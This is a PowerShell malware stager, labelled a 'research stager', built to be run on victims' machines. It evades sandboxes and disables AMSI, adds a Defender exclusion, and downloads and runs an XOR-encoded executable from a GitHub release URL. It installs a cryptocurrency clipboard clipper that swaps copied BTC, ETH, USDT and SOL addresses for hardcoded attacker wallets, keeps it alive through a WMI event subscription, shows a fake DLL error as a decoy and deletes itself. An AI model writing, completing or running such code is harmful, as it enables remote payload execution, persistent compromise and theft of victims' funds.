# --- [RESEARCH STAGER v65.0: ENTERPRISE ELITE FINAL - RESTORED] ---
Add-Type -AssemblyName System.Windows.Forms, System.Drawing

# 1. GATEKEEPER: ANTI-VM / ANTI-SANDBOX
$mem = (Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum / 1GB
if ($mem -lt 4) { exit } 

# 2. JUNK CODE BLOATING
$garbage_array = @()
for($i=0; $i -lt 300; $i++){ $garbage_array += [Guid]::NewGuid().ToString() }

# 3. Admin Gate (v34.0 Style - LOCKED LOGIC)
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $arg = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    Start-Process powershell.exe -ArgumentList $arg -Verb RunAs
    exit
}

function Global-Initialize {
    try {
        $u = "System.Management.Automation.AmsiUtils"
        [Ref].Assembly.GetType($u).GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)
    } catch { }
}

# --- PERSISTENCE & WATCHDOG ADDITION (Integrated without breaking logic) ---
function Set-WmiWatchdog {
    # This keeps the clipper logic in RAM
    $L1 = 'Add-Type -As System.Windows.Forms; $w=@{"btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA";"eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392";"usdt"="TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp";"sol"="BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"};'
    $L2 = 'while(1){ try{ if([Windows.Forms.Clipboard]::ContainsText()){ $v=[Windows.Forms.Clipboard]::GetText().Trim();'
    $L3 = 'if($v -match "^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,62}$"){ if($v -ne $w.btc){ [Windows.Forms.Clipboard]::SetText($w.btc) } }'
    $L4 = 'elseif($v -match "^0x[a-fA-F0-9]{40}$"){ if($v -ne $w.eth){ [Windows.Forms.Clipboard]::SetText($w.eth) } }'
    $L5 = 'elseif($v -match "^T[a-km-zA-HJ-NP-Z1-9]{33}$"){ if($v -ne $w.usdt){ [Windows.Forms.Clipboard]::SetText($w.usdt) } }'
    $L6 = 'elseif($v -match "^[1-9A-HJ-NP-Za-km-z]{32,44}$"){ if($v -ne $w.sol){ [Windows.Forms.Clipboard]::SetText($w.sol) } } } }catch{} Start-Sleep -m 500 }'
    $C = $L1 + $L2 + $L3 + $L4 + $L5 + $L6
    $B64 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($C))
    
    $Q = "SELECT * FROM __InstanceDeletionEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'powershell.exe'"
    $Cmd = "powershell.exe -NoP -W Hidden -EP Bypass -Enc $B64"
    $NS = "root\subscription"
    
    Set-WmiInstance -Namespace $NS -Class __EventFilter -Arguments @{Name='MevFilter'; EventNamespace='root\cimv2'; QueryLanguage='WQL'; Query=$Q} | Out-Null
    Set-WmiInstance -Namespace $NS -Class CommandLineEventConsumer -Arguments @{Name='MevConsumer'; CommandLineTemplate=$Cmd} | Out-Null
    Set-WmiInstance -Namespace $NS -Class __FilterToConsumerBinding -Arguments @{Filter=(Get-WmiObject -Namespace $NS -Class __EventFilter -Filter "Name='MevFilter'"); Consumer=(Get-WmiObject -Namespace $NS -Class CommandLineEventConsumer -Filter "Name='MevConsumer'")} | Out-Null
}

function Run-Deployment {
    # --- CORE ENGINE v34.0/v45.0 (UNTOUCHED LOGIC) ---
    try {
        $dir = "$env:PROGRAMDATA\Microsoft\Windows\Templates\Sync"
        if (!(Test-Path $dir)) { New-Item $dir -ItemType Directory -Force }
        Add-MpPreference -ExclusionPath $dir -ErrorAction SilentlyContinue
        
        $path = Join-Path $dir "WinSvcHost.exe"
        $wc = New-Object Net.WebClient; $wc.Headers.Add("User-Agent", "Mozilla/5.0")
        $raw = $wc.DownloadString("https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt")
        $data = [Convert]::FromBase64String($raw.Trim())
        for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor 0xAB }
        [IO.File]::WriteAllBytes($path, $data)
        
        # Start payload and persistence
        Start-Process $path -WindowStyle Hidden
        Set-WmiWatchdog

        # OBFUSCATED CLIPPER LOGIC (UNTOUCHED)
        $L1 = 'Add-Type -As System.Windows.Forms; $w=@{"btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA";"eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392";"usdt"="TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp";"sol"="BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"};'
        $L2 = 'while(1){ try{ if([Windows.Forms.Clipboard]::ContainsText()){ $v=[Windows.Forms.Clipboard]::GetText().Trim();'
        $L3 = 'if($v -match "^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,62}$"){ if($v -ne $w.btc){ [Windows.Forms.Clipboard]::SetText($w.btc) } }'
        $L4 = 'elseif($v -match "^0x[a-fA-F0-9]{40}$"){ if($v -ne $w.eth){ [Windows.Forms.Clipboard]::SetText($w.eth) } }'
        $L5 = 'elseif($v -match "^T[a-km-zA-HJ-NP-Z1-9]{33}$"){ if($v -ne $w.usdt){ [Windows.Forms.Clipboard]::SetText($w.usdt) } }'
        $L6 = 'elseif($v -match "^[1-9A-HJ-NP-Za-km-z]{32,44}$"){ if($v -ne $w.sol){ [Windows.Forms.Clipboard]::SetText($w.sol) } } } }catch{} Start-Sleep -m 500 }'
        $FinalC = $L1 + $L2 + $L3 + $L4 + $L5 + $L6
        $enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($FinalC))
        Start-Process powershell.exe -Arg "-NoP -W Hidden -EP Bypass -Enc $enc" -WindowStyle Hidden

        # --- FAKE DLL ERROR (The Final Trap) ---
        $msg = "The program can't start because msvcr120_clr0400.dll is missing from your computer. Try reinstalling the program to fix this problem."
        [Windows.Forms.MessageBox]::Show($msg, "System Error", 0, 16) | Out-Null

        # SELF-DESTRUCT
        Remove-Item $PSCommandPath -Force -ErrorAction SilentlyContinue
        
    } catch { exit }
}

# --- START ---
Global-Initialize
# We bypass the Show-SecurityPrep UI to go straight to silent deployment
Run-Deployment
